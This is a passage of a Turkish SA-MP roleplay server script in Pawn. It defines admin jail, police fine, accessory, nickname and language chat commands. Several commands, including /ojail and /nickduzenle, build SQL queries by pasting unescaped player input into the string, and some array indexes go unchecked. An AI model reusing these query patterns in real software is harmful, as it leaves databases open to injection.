    if(Karakter[playerid][adminlevel] < 2 || !Girdi[playerid]) return 1;
    new _name[32], _dakika, _sebep[128];
	if(sscanf(params,"s[32]ds[128]",_name,_dakika,_sebep)) return Kullanim(playerid, "/ojail [Isim] [Dakika] [Sebep]");
	foreach(new i : Player)
	{
	    if(Buysa(Isim(i),_name))
	    {
	        Hata(playerid, "Oyuncu zaten oyunda.");
	        return 1;
	    }
	}
	new _sqlid = IsimKontrol(_name);
	if(_sqlid == 0) return Hata(playerid, "Bu isimde oyuncu bulunmamaktadýr.");
	new query[512];
	format(query, sizeof(query), "UPDATE `karakterler` SET `ajail` = '%d' WHERE `id` = '%d'", _dakika, _sqlid);
	mysql_tquery(1,query);
	new mtext[20];
	new year, month,day;
	getdate(year, month, day);
	if(month == 1) { mtext = "Ocak"; }
	else if(month == 2) { mtext = "Subat"; }
	else if(month == 3) { mtext = "Mart"; }
	else if(month == 4) { mtext = "Nisan"; }
	else if(month == 5) { mtext = "Mayis"; }
	else if(month == 6) { mtext = "Haziran"; }
	else if(month == 7) { mtext = "Temmuz"; }
	else if(month == 8) { mtext = "Agustos"; }
	else if(month == 9) { mtext = "Eylul"; }
	else if(month == 10) { mtext = "Ekim"; }
	else if(month == 11) { mtext = "Kasim"; }
	else if(month == 12) { mtext = "Aralik"; }
	new hour,minuite,second;
	gettime(hour,minuite,second);
	new mstring[512];
	format(mstring, sizeof(mstring), "%d %s %d - %d:%d", day,mtext,year,hour,minuite);
	format(query, sizeof(query), "INSERT INTO `oochapis` (`ad`,`nick`,`sebep`,`sure`,`tarih`,`yonetici`) VALUES ('%s','%s','%s','%d','%s','%s')",
	_name,
	SQLNick(_sqlid),
	_sebep,
	_dakika,
	mstring,
	Karakter[playerid][anick]);
	mysql_tquery(1,query);
	Bilgi(playerid, "Oyuncunun hesabýný jaile attýnýz.");
	format(mstring, sizeof(mstring), "(( %s cezalandýrýldý. Süre: %d Sebep: %s %d/%s%d/%s%d - %s%d:%s%d ))", _name, _dakika, _sebep, day, ((month < 10) ? ("0") : ("")), month, (year < 10) ? ("0") : (""), year, (hour < 10) ? ("0") : (""), hour, (minuite < 10) ? ("0") : (""), minuite);
	SendClientMessageToAll(COLOR_RED, mstring);
	return 1;
}

CMD:hedefsifirla(playerid, params[])
{
	if(IsPlayerInAnyVehicle(playerid)) return Hata(playerid, "Araçtan inmeniz gerekli.");
    meslekbul[playerid] = 0;
    DeletePVar(playerid, "LSPDTelTakip");
    DeletePVar(playerid, "GPSActi");
    DeletePVar(playerid, "ParkCP");
    PizzaCheckpoint[playerid] = 0;
    SevkiyatCheckpoint[playerid] = 0;
    ehliyetcp[playerid] = 0;
    Karakter[playerid][pCheckpoint] = 0;
	DisablePlayerCheckpoint(playerid);
	Bilgi(playerid, "Hedef sýfýrladýnýz.");
	return 1;
}

CMD:hudkapat(playerid, params[])
{
	if(!Girdi[playerid]) return 1;
	if(!IsPlayerInAnyVehicle(playerid)) return Hata(playerid, "Herhangi bir araçta deðilsiniz.");
	if(GetPVarInt(playerid, "HUD") == 1)
	{
		GostergeGoster(playerid);
		if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 420) TaksimetreGoster(playerid);
	    DeletePVar(playerid, "HUD");
		Bilgi(playerid, "Gösterge hudunu açtýnýz.");
	}
	else
	{
	    GostergeGizle(playerid);
		TaksimetreGizle(playerid);
	    SetPVarInt(playerid, "HUD", 1);
		Bilgi(playerid, "Gösterge hudunu kapattýnýz.");
	}
	return 1;
}
CMD:aksesuar(playerid, params[])
{
    if(!Girdi[playerid]) return 1;
    if(isnull(params))
    {
		Kullanim(playerid, "/aksesuar [fonksiyon]");
		SendClientMessage(playerid, -1, "Geçerli fonksiyonlar:{B3B3B3} giy, duzenle, sifirla");
		return 1;
	}
	new nstring[16],_aid=-1;
	sscanf(params,"s[16]d",nstring,_aid);
	if(Buysa("duzenle",nstring))
	{
		if(aksEdit[playerid] != -1) return 1;
		new zaxd = 0;
		new mstring[256];
        for(new x;x<5;x++)
        {
            if(MySQLCheckAksesuar(Karakter[playerid][sqlid],x) != 0){ format(mstring, sizeof(mstring), "%s%s (SLOT %d)\n", mstring, GetAksesuarNameFromList(aksesuar[playerid][x][amodel]),x); zaxd++; }
            else { format(mstring, sizeof(mstring), "%s(Yok)\n",mstring); }
        }
	    if(zaxd == 0)
		{
			Hata(playerid, "Henüz bir aksesuar satýn almamýþsýnýz. Kýyafet dükkanlarýndan aksesuar satýn alabilirsiniz.");
			return 1;
        }
        ShowPlayerDialog(playerid, 142, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"Slot Seçiniz", mstring, "Seç", "Ýptal");
	}
	else if(Buysa("giy",nstring))
	{
		if(aksEdit[playerid] != -1) return 1;
		if(_aid == -1)
		{
			Kullanim(playerid, "/aksesuar giy [0-4]");
			return 1;
		}
		if(_aid < 0 || _aid > 4)
		{
			Hata(playerid, "Yanlýþ slot.");
			return 1;
		}
		if(MySQLCheckAksesuar(Karakter[playerid][sqlid],_aid) == 0)
		{
			Hata(playerid, "Bu slotta bir aksesuar bulunmuyor. Kýyafet dükkanlarýndan aksesuar satýn alabilirsiniz.");
			return 1;
		}
		if(aksesuar[playerid][_aid][giyilmis] == true)
		{
			RemovePlayerAttachedObject(playerid,_aid);
			aksesuar[playerid][_aid][giyilmis] = false;
			AksesuarGuncelle(playerid,_aid);
			return 1;
		}
		else
		{
			SetPlayerAttachedObject(playerid,_aid,aksesuar[playerid][_aid][amodel],aksesuar[playerid][_aid][abone],aksesuar[playerid][_aid][akX],aksesuar[playerid][_aid][akY],aksesuar[playerid][_aid][akZ],aksesuar[playerid][_aid][arX],aksesuar[playerid][_aid][arY],aksesuar[playerid][_aid][arZ],aksesuar[playerid][_aid][aoX],aksesuar[playerid][_aid][aoY],aksesuar[playerid][_aid][aoZ],aksesuar[playerid][_aid][arenk1],aksesuar[playerid][_aid][arenk2]);
			aksesuar[playerid][_aid][giyilmis] = true;
			AksesuarGuncelle(playerid,_aid);
		}
	    return 1;
	}
	else if(Buysa("sifirla",nstring)) ShowPlayerDialog(playerid, 167, DIALOG_STYLE_MSGBOX, "[!]DÝKKAT", "Bu iþlem tüm aksesuarlarýnýzý silecektir. Onaylýyor musunuz?", "Evet", "Hayýr");
	return 1;
}

AKontrol(playerid) return Karakter[playerid][aGirdi];

CMD:nickduzenle(playerid, params[])
{
	if(Karakter[playerid][adminlevel] >= 4 && Girdi[playerid] && AKontrol(playerid))
	{
		new _nick[32],pid;
		new mstring[128];
		if(sscanf(params,"ds[32]",pid,_nick)) return Kullanim(playerid, "/nickduzenle [ID] [nick]"),format(mstring, sizeof(mstring), "%s - Nick:%s",OyuncuAdiniBul(pid),Karakter[pid][nick]),Bilgi(playerid, mstring);
		if(!IsPlayerConnected(playerid)) return Hata(playerid, "Oyuncu oyuna baðlý deðil.");
		format(mstring, sizeof(mstring), "%s adlý oyuncunun nickini %s olarak düzenlediniz.",OyuncuAdiniBul(pid),_nick);
		Bilgi(playerid, mstring);
		format(mstring, sizeof(mstring), "%s sizin nickinizi %s olarak düzenledi.",Karakter[playerid][anick],_nick);
		Bilgi(pid, mstring);
		format(Karakter[pid][nick], 32, "%s", _nick);
		format(mstring, sizeof(mstring), "UPDATE `karakterler` SET `Nickname` = '%s' WHERE `id` = '%d'",_nick,Karakter[pid][sqlid]);
		mysql_tquery(1,mstring);
	}
	return 1;
}

CMD:yemdegistir(playerid, params[])
{
	if(!Girdi[playerid] || !Karakter[playerid][olta]) return 1;
	if(YemOltada[playerid] == 1) return Hata(playerid, "Þu an yem deðiþtiremezsiniz.");
	if(BalikTutuyor[playerid] == 1) return Hata(playerid, "Þu an yem deðiþtiremezsiniz.");
	new mstring[128];
	format(mstring, sizeof(mstring), "Karides\t\t ["C2"%d"C1"]\nKurt\t\t ["C2"%d"C1"]\nEkmek\t\t ["C2"%d"C1"]", Karakter[playerid][yemmiktar][1], Karakter[playerid][yemmiktar][2], Karakter[playerid][yemmiktar][3]);
	ShowPlayerDialog(playerid, 296, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"Yem Deðiþtir", mstring, "Seç", "Ýptal");
	return 1;
}

CMD:cezakes(playerid, params[])
{
    if(Birlik[Karakter[playerid][birlik]][ftip] != LSPD)
    {
        Hata(playerid, "Bu komutu yalnýzca Polis Departmaný kullanabilir.");
        return 1;
	}
	new cezakesilen,miktar,_s[128];
	if(sscanf(params,"dds[128]",cezakesilen,miktar,_s))
	{
		Kullanim(playerid, "/cezakes [oyuncuID] [miktar] [sebep]");
		return 1;
	}
	if(!Karakter[playerid][isbasi]) return Hata(playerid, "Ýþbaþý olmamýþsýnýz.");
	if(cezakesilen == playerid) return Hata(playerid, "Kendi kendinize ceza kesemezsiniz.");
	if(Girdi[cezakesilen])
	{
		if(cezakesilen != INVALID_PLAYER_ID)
		{
			if(miktar <= 1000 && miktar > 0)
		    {
				new string[200];
				new xsstring[1024];
				format(xsstring, sizeof(xsstring), "\t "C1"CEZA KAÐIDI ( "C2"%s "C1")\n\n"C1"Cezayý Kesen:\t\t "C2"%s\n"C1"Ceza Nedeni:\t\t "C2"%s\n"C1"Ceza Ücreti:\t\t "C2"%d"DOLAR"$",OyuncuAdiniBul(cezakesilen),OyuncuAdiniBul(playerid),_s,miktar);
				ShowPlayerDialog(cezakesilen, 297, DIALOG_STYLE_MSGBOX, ""C7"EIGHTBORN - "C8"Ceza Kaðýdý", xsstring, "Tamam", "");
				format(string,sizeof(string),"%s adlý memur size ceza kesti.",OyuncuAdiniBul(playerid));
				Bilgi(cezakesilen,string);
				format(string, sizeof(string), "%s adlý oyuncuya ceza kestiniz.", OyuncuAdiniBul(cezakesilen));
				Bilgi(playerid, string);
				Karakter[cezakesilen][ceza] += miktar;
				format(Karakter[cezakesilen][cezaneden],512,"%s, %s",Karakter[cezakesilen][cezaneden], _s);
				KarakterKaydet(cezakesilen);
				format(string,sizeof(string),"{ffff00}[!][LSPD] Memur %s, %s isimli vatandaþa %d$ ceza kesti. Sebep: %s",OyuncuAdiniBul(playerid),OyuncuAdiniBul(cezakesilen),miktar,_s);
				for(new i=0;i<MAX_PLAYERS;i++){
				if(Birlik[Karakter[i][birlik]][ftip] == LSPD && Girdi[i]){
				MesajGonder(i,0xFFFF00FF,string);
				}
				}
			}
			else
			{
				Hata(playerid, "Tek seferde en fazla $1000 ceza kesebilirsiniz!");
			}
		}
	}
	return 1;
}
CMD:araccezakes(playerid, params[])
{
    if(Birlik[Karakter[playerid][birlik]][ftip] != LSPD)
    {
        Hata(playerid, "Bu komutu yalnýzca Polis Departmaný kullanabilir.");
        return 1;
	}
	new tid,miktarx,_sx[128];
 	if(!Karakter[playerid][isbasi]) return Hata(playerid, "Ýþbaþý olmamýþsýnýz.");
	if(sscanf(params,"dds[128]",tid,miktarx,_sx) || miktarx < 0)
	{
		Kullanim(playerid, "/araccezakes [aracID] [miktar] [sebep]");
		return 1;
	}
	cezali[tid] += miktarx;
    new string[200];
    format(string, sizeof(string), "/me ceza makbuzuna bir þeyler karalar %s plakalý aracýn ön camýna yapýþtýrýr.", Arac[tid][aplaka]);
    OnPlayerCommandPerformed(playerid, string,0);
  	format(string,sizeof(string),"{ffff00}[!][LSPD] Memur %s, %s plakalý araca %d$ ceza kesti. Sebep: %s",OyuncuAdiniBul(playerid),Arac[tid][aplaka],miktarx,_sx);
	for(new i=0;i<MAX_PLAYERS;i++){
		if(Birlik[Karakter[i][birlik]][ftip] == LSPD && Girdi[i]){
			MesajGonder(i,0xFFFF00FF,string);
		}
	}
	/*foreach(new i : Player)
	{
	if(Karakter[i][sqlid] == Arac[tid][aowner])
	{
	new mstring[128];
	format(mstring, sizeof(mstring), "Aracýna ceza kesildi, ceza ücreti : %d$ - Ödemek için ''/a cezaode''.", cezali[tid]);
	Bilgi(i, mstring);
	}
	}*/
	return 1;
}
CMD:acezasifirla(playerid, params[])
{
    if(Karakter[playerid][adminlevel] >= 1 && Karakter[playerid][aGirdi] == 1)
	{
		new tid;
		if(sscanf(params,"d",tid))
		{
			Kullanim(playerid, "/acezasifirla [aracID]");
			return 1;
		}
		cezali[tid] = 0;
	}
	/*foreach(new i : Player)
	{
	if(Karakter[i][sqlid] == Arac[tid][aowner])
	{
	new mstring[128];
	format(mstring, sizeof(mstring), "Aracýna ceza kesildi, ceza ücreti : %d$ - Ödemek için ''/a cezaode''.", cezali[tid]);
	Bilgi(i, mstring);
	}
	}*/
	return 1;
}
CMD:telsizkodlari(playerid, params[])
{
	if(!Girdi[playerid]) return 1;
	if(Birlik[Karakter[playerid][birlik]][ftip] != LSPA && Birlik[Karakter[playerid][birlik]][ftip] != LSPD && Birlik[Karakter[playerid][birlik]][ftip] != FBI) return 1;
	new mstring[128];
	strcat(mstring, "Genel Kodlar\n");
	strcat(mstring, "Vaka Kodlarý\n");
	strcat(mstring, "Durum Kodlarý\n");
	strcat(mstring, "Birim Kodlarý\n");
	strcat(mstring, "Trafik Kanunlarý");
	ShowPlayerDialog(playerid, 298, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"LSPD Kodlar", mstring, "Seç", "Ýptal");
	return 1;
}

DilNameEx(_tip)
{
	new _dtext[32];
	switch(_tip)
	{
	    case 0: _dtext = "Ýngilizce";
	    case 1: _dtext = "Almanca";
	    case 2: _dtext = "Arapça";
	    case 3: _dtext = "Çince";
	    case 4: _dtext = "Fransýzca";
	    case 5: _dtext = "Ýspanyolca";
	    case 6: _dtext = "Ýtalyanca";
	    case 7: _dtext = "Japonca";
	    case 8: _dtext = "Rusça";
	    case 9: _dtext = "Ýbranice";
	    case 10: _dtext = "Yunanca";
	    case 11: _dtext = "Ermenice";
	    case 12: _dtext = "Slovakça";
	    case 13: _dtext = "Ýrlandaca";
	    case 14: _dtext = "Portekizce";
	    case 15: _dtext = "Sýrpça";
	    case 16: _dtext = "Arnavutça";
	}
	return _dtext;
}

DilName2(_dil)
{
	new _dtext[32];
	switch(_dil)
	{
	    case 0: _dtext = "Ýngilizce";
	    case 1: _dtext = "Almanca";
	    case 2: _dtext = "Arapça";
	    case 3: _dtext = "Çince";
	    case 4: _dtext = "Fransýzca";
	    case 5: _dtext = "Ýspanyolca";
	    case 6: _dtext = "Ýtalyanca";
	    case 7: _dtext = "Japonca";
	    case 8: _dtext = "Rusça";
	    case 9: _dtext = "Ýbranice";
	    case 10: _dtext = "Yunanca";
	    case 11: _dtext = "Ermenice";
	    case 12: _dtext = "Slovakça";
	    case 13: _dtext = "Ýrlandaca";
	    case 14: _dtext = "Portekizce";
	    case 15: _dtext = "Sýrpça";
	    case 16: _dtext = "Arnavutça";
	}
	return _dtext;
}

DilName(playerid)
{
	new _dtext[32];
	switch(Karakter[playerid][dil])
	{
	    case 0: _dtext = "Ýngilizce";
	    case 1: _dtext = "Almanca";
	    case 2: _dtext = "Arapça";
	    case 3: _dtext = "Çince";
	    case 4: _dtext = "Fransýzca";
	    case 5: _dtext = "Ýspanyolca";
	    case 6: _dtext = "Ýtalyanca";
	    case 7: _dtext = "Japonca";
	    case 8: _dtext = "Rusça";
	    case 9: _dtext = "Ýbranice";
	    case 10: _dtext = "Yunanca";
	    case 11: _dtext = "Ermenice";
	    case 12: _dtext = "Slovakça";
	    case 13: _dtext = "Ýrlandaca";
	    case 14: _dtext = "Portekizce";
	    case 15: _dtext = "Sýrpça";
	    case 16: _dtext = "Arnavutça";
	}
	return _dtext;
}

stock DillerimEx(playerid)
{
	new _dtext[128];
	switch(Karakter[playerid][dil])
	{
	    case 0: _dtext = ""C1"Ýngilizce";
	    case 1: _dtext = ""C1"Almanca \t"C2"(/alm)";
	    case 2: _dtext = ""C1"Arapça \t"C2"(/arp)";
	    case 3: _dtext = ""C1"Çince \t"C2"(/cin)";
	    case 4: _dtext = ""C1"Fransýzca \t"C2"(/fra)";
	    case 5: _dtext = ""C1"Ýspanyolca \t"C2"(/isp)";
	    case 6: _dtext = ""C1"Ýtalyanca \t"C2"(/ita)";
	    case 7: _dtext = ""C1"Japonca \t"C2"(/jap)";
	    case 8: _dtext = ""C1"Rusça \t"C2"(/rus)";
	    case 9: _dtext = ""C1"Ýbranice \t"C2"(/ibr)";
	    case 10: _dtext = ""C1"Yunanca \t"C2"(/yun)";
	    case 11: _dtext = ""C1"Ermenice \t"C2"(/erm)";
	    case 12: _dtext = ""C1"Slovakça \t"C2"(/slo)";
	    case 13: _dtext = ""C1"Ýrlandaca \t"C2"(/irl)";
	    case 14: _dtext = ""C1"Portekizce \t"C2"(/por)";
	    case 15: _dtext = ""C1"Sýrpça \t"C2"(/sir)";
	    case 16: _dtext = ""C1"Arnavutça \t"C2"(/arn)";
	}
	return _dtext;
}

CMD:alm(playerid, params[])
{
	if(Karakter[playerid][dil] != 1 && Karakter[playerid][alm] != 10) return Hata(playerid, "Bu dili bilmiyorsunuz.");
	SetPVarInt(playerid, "SectigiDil", 1);
	if(isnull(params)) return Kullanim(playerid, "/alm(anca) [yazý]");
	new string[256];
	dilkullaniyor[playerid] = true;
	if(strlen(params) > 80)
	{
		new toxt[3][128];
		TextBol(params,toxt,60);
		if(Arama[playerid][2] != 0)
		{
		    TelefonYaziGonder(playerid, Arama[playerid][2], params);
			format(string, sizeof(string), "%s(telefon) %s ...",OyuncuAdiniBul(playerid), toxt[0]);
		}
		else format(string, sizeof(string), "%s %s ...",OyuncuAdiniBul(playerid), toxt[0]);
		ProxDetectorEx(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5,1);
		format(string, sizeof(string), "%s ... %s",OyuncuAdiniBul(playerid), toxt[1]);
		ProxDetectorEx(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5,1);
		KonusturMeyhaneci(playerid, strlen(params));
  	}
	else
	{
		if(Arama[playerid][2] != 0)
		{
		    TelefonYaziGonder(playerid, Arama[playerid][2], params);
			format(string, sizeof(string), "%s(telefon) %s",OyuncuAdiniBul(playerid), params);
		}
		else format(string, sizeof(string), "%s %s",OyuncuAdiniBul(playerid), params);
		ProxDetectorEx(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5,1);
		new to_others[MAX_CHATBUBBLE_LENGTH+1];
		format(to_others,MAX_CHATBUBBLE_LENGTH,"\"%s\"",params);
		KonusturMeyhaneci(playerid, strlen(params));
	}
	dilkullaniyor[playerid] = false;
	return 1;
}

CMD:arp(playerid, params[])
{
	if(Karakter[playerid][dil] != 2 && Karakter[playerid][arp] != 10) return Hata(playerid, "Bu dili bilmiyorsunuz.");
	SetPVarInt(playerid, "SectigiDil", 2);
	if(isnull(params)) return Kullanim(playerid, "/arp(ça) [yazý]");
	new string[256];
	dilkullaniyor[playerid] = true;
	if(strlen(params) > 80)
	{
		new toxt[3][128];
		TextBol(params,toxt,60);
		if(Arama[playerid][2] != 0)
		{
		    TelefonYaziGonder(playerid, Arama[playerid][2], params);
			format(string, sizeof(string), "%s(telefon) %s ...",OyuncuAdiniBul(playerid), toxt[0]);
		}
		else format(string, sizeof(string), "%s %s ...",OyuncuAdiniBul(playerid), toxt[0]);
		ProxDetectorEx(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5,2);
		format(string, sizeof(string), "%s ... %s",OyuncuAdiniBul(playerid), toxt[1]);
		ProxDetectorEx(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5,2);
		KonusturMeyhaneci(playerid, strlen(params));
  	}
	else
	{
		if(Arama[playerid][2] != 0)
		{
		    TelefonYaziGonder(playerid, Arama[playerid][2], params);
			format(string, sizeof(string), "%s(telefon) %s",OyuncuAdiniBul(playerid), params);
		}
		else format(string, sizeof(string), "%s %s",OyuncuAdiniBul(playerid), params);
		ProxDetectorEx(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5,2);
		new to_others[MAX_CHATBUBBLE_LENGTH+1];
		format(to_others,MAX_CHATBUBBLE_LENGTH,"\"%s\"",params);
		KonusturMeyhaneci(playerid, strlen(params));
	}
	dilkullaniyor[playerid] = false;
	return 1;
}

CMD:cin(playerid, params[])
{
	if(Karakter[playerid][dil] != 3 && Karakter[playerid][cin] != 10) return Hata(playerid, "Bu dili bilmiyorsunuz.");
	SetPVarInt(playerid, "SectigiDil", 3);
	if(isnull(params)) return Kullanim(playerid, "/cin(ce) [yazý]");
	new string[256];
	dilkullaniyor[playerid] = true;
	if(strlen(params) > 80)
	{
		new toxt[3][128];
		TextBol(params,toxt,60);
		if(Arama[playerid][2] != 0)
		{
		    TelefonYaziGonder(playerid, Arama[playerid][2], params);
			format(string, sizeof(string), "%s(telefon) %s ...",OyuncuAdiniBul(playerid), toxt[0]);
		}
		else format(string, sizeof(string), "%s %s ...",OyuncuAdiniBul(playerid), toxt[0]);
		ProxDetectorEx(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5,3);
		format(string, sizeof(string), "%s ... %s",OyuncuAdiniBul(playerid), toxt[1]);
		ProxDetectorEx(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5,3);
		KonusturMeyhaneci(playerid, strlen(params));
  	}
	else
	{
		if(Arama[playerid][2] != 0)
		{
		    TelefonYaziGonder(playerid, Arama[playerid][2], params);
			format(string, sizeof(string), "%s(telefon) %s",OyuncuAdiniBul(playerid), params);
		}
		else format(string, sizeof(string), "%s %s",OyuncuAdiniBul(playerid), params);
		ProxDetectorEx(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5,3);
		new to_others[MAX_CHATBUBBLE_LENGTH+1];
		format(to_others,MAX_CHATBUBBLE_LENGTH,"\"%s\"",params);
		KonusturMeyhaneci(playerid, strlen(params));
	}
	dilkullaniyor[playerid] = false;
	return 1;
}

CMD:fra(playerid, params[])
{
	if(Karakter[playerid][dil] != 4 && Karakter[playerid][fra] != 10) return Hata(playerid, "Bu dili bilmiyorsunuz.");
	SetPVarInt(playerid, "SectigiDil", 4);
	if(isnull(params)) return Kullanim(playerid, "/fra(nsýzca) [yazý]");
	new string[256];
	dilkullaniyor[playerid] = true;
	if(strlen(params) > 80)
	{
		new toxt[3][128];
		TextBol(params,toxt,60);
		if(Arama[playerid][2] != 0)
		{
		    TelefonYaziGonder(playerid, Arama[playerid][2], params);
			format(string, sizeof(string), "%s(telefon) %s ...",OyuncuAdiniBul(playerid), toxt[0]);
		}
		else format(string, sizeof(string), "%s %s ...",OyuncuAdiniBul(playerid), toxt[0]);
		ProxDetectorEx(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5,4);
		format(string, sizeof(string), "%s ... %s",OyuncuAdiniBul(playerid), toxt[1]);
		ProxDetectorEx(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5,4);
		KonusturMeyhaneci(playerid, strlen(params));
  	}
	else
	{
		if(Arama[playerid][2] != 0)
		{
		    TelefonYaziGonder(playerid, Arama[playerid][2], params);
			format(string, sizeof(string), "%s(telefon) %s",OyuncuAdiniBul(playerid), params);
		}
		else format(string, sizeof(string), "%s %s",OyuncuAdiniBul(playerid), params);
		ProxDetectorEx(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5,4);
		new to_others[MAX_CHATBUBBLE_LENGTH+1];
		format(to_others,MAX_CHATBUBBLE_LENGTH,"\"%s\"",params);
		KonusturMeyhaneci(playerid, strlen(params));
	}
	dilkullaniyor[playerid] = false;
	return 1;
}

CMD:isp(playerid, params[])
{
	if(Karakter[playerid][dil] != 5 && Karakter[playerid][isp] != 10) return Hata(playerid, "Bu dili bilmiyorsunuz.");
	SetPVarInt(playerid, "SectigiDil", 5);
	if(isnull(params)) return Kullanim(playerid, "/isp(anyolca) [yazý]");
	new string[256];
	dilkullaniyor[playerid] = true;
	if(strlen(params) > 80)
	{
		new toxt[3][128];
		TextBol(params,toxt,60);
		if(Arama[playerid][2] != 0)
		{
		    TelefonYaziGonder(playerid, Arama[playerid][2], params);
			format(string, sizeof(string), "%s(telefon) %s ...",OyuncuAdiniBul(playerid), toxt[0]);
		}
		else format(string, sizeof(string), "%s %s ...",OyuncuAdiniBul(playerid), toxt[0]);
		ProxDetectorEx(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5,5);
		format(string, sizeof(string), "%s ... %s",OyuncuAdiniBul(playerid), toxt[1]);
		ProxDetectorEx(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5,5);
		KonusturMeyhaneci(playerid, strlen(params));
  	}
	else
	{
		if(Arama[playerid][2] != 0)
		{
		    TelefonYaziGonder(playerid, Arama[playerid][2], params);
			format(string, sizeof(string), "%s(telefon) %s",OyuncuAdiniBul(playerid), params);
		}
		else format(string, sizeof(string), "%s %s",OyuncuAdiniBul(playerid), params);
		ProxDetectorEx(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5,5);
		new to_others[MAX_CHATBUBBLE_LENGTH+1];
		format(to_others,MAX_CHATBUBBLE_LENGTH,"\"%s\"",params);
		KonusturMeyhaneci(playerid, strlen(params));
	}
	dilkullaniyor[playerid] = false;
	return 1;
}

CMD:ita(playerid, params[])
{
	if(Karakter[playerid][dil] != 6 && Karakter[playerid][ita] != 10) return Hata(playerid, "Bu dili bilmiyorsunuz.");
	SetPVarInt(playerid, "SectigiDil", 6);
	if(isnull(params)) return Kullanim(playerid, "/ita(lyanca) [yazý]");
	new string[256];
	dilkullaniyor[playerid] = true;
	if(strlen(params) > 80)
	{
		new toxt[3][128];
		TextBol(params,toxt,60);
		if(Arama[playerid][2] != 0)
		{
		    TelefonYaziGonder(playerid, Arama[playerid][2], params);
			format(string, sizeof(string), "%s(telefon) %s ...",OyuncuAdiniBul(playerid), toxt[0]);
		}
		else format(string, sizeof(string), "%s %s ...",OyuncuAdiniBul(playerid), toxt[0]);
		ProxDetectorEx(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5,6);
		format(string, sizeof(string), "%s ... %s",OyuncuAdiniBul(playerid), toxt[1]);
		ProxDetectorEx(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5,6);
		KonusturMeyhaneci(playerid, strlen(params));
  	}
	else
	{
		if(Arama[playerid][2] != 0)
		{
		    TelefonYaziGonder(playerid, Arama[playerid][2], params);
			format(string, sizeof(string), "%s(telefon) %s",OyuncuAdiniBul(playerid), params);
		}
		else format(string, sizeof(string), "%s: %s",OyuncuAdiniBul(playerid), params);
		ProxDetectorEx(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5,6);
		new to_others[MAX_CHATBUBBLE_LENGTH+1];
		format(to_others,MAX_CHATBUBBLE_LENGTH,"\"%s\"",params);
		KonusturMeyhaneci(playerid, strlen(params));
	}
	dilkullaniyor[playerid] = false;
	return 1;
}

CMD:jap(playerid, params[])
{
	if(Karakter[playerid][dil] != 7 && Karakter[playerid][japon] != 10) return Hata(playerid, "Bu dili bilmiyorsunuz.");
	SetPVarInt(playerid, "SectigiDil", 7);
	if(isnull(params)) return Kullanim(playerid, "/jap(onca) [yazý]");
	new string[256];
	dilkullaniyor[playerid] = true;
	if(strlen(params) > 80)
	{
		new toxt[3][128];
		TextBol(params,toxt,60);
		if(Arama[playerid][2] != 0)
		{
		    TelefonYaziGonder(playerid, Arama[playerid][2], params);
			format(string, sizeof(string), "%s(telefon) %s ...",OyuncuAdiniBul(playerid), toxt[0]);
		}
		else format(string, sizeof(string), "%s %s ...",OyuncuAdiniBul(playerid), toxt[0]);
		ProxDetectorEx(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5,7);
		format(string, sizeof(string), "%s ... %s",OyuncuAdiniBul(playerid), toxt[1]);
		ProxDetectorEx(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5,7);
		KonusturMeyhaneci(playerid, strlen(params));
  	}
	else
	{
		if(Arama[playerid][2] != 0)
		{
		    TelefonYaziGonder(playerid, Arama[playerid][2], params);
			format(string, sizeof(string), "%s(telefon) %s",OyuncuAdiniBul(playerid), params);
		}
		else format(string, sizeof(string), "%s %s",OyuncuAdiniBul(playerid), params);
		ProxDetectorEx(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5,7);
		new to_others[MAX_CHATBUBBLE_LENGTH+1];
		format(to_others,MAX_CHATBUBBLE_LENGTH,"\"%s\"",params);
		KonusturMeyhaneci(playerid, strlen(params));
	}
	dilkullaniyor[playerid] = false;
	return 1;
}

CMD:rus(playerid, params[])
{
	if(Karakter[playerid][dil] != 8 && Karakter[playerid][rus] != 10) return Hata(playerid, "Bu dili bilmiyorsunuz.");
	SetPVarInt(playerid, "SectigiDil", 8);
	if(isnull(params)) return Kullanim(playerid, "/rus(ca) [yazý]");
	new string[256];
	dilkullaniyor[playerid] = true;
	if(strlen(params) > 80)
	{
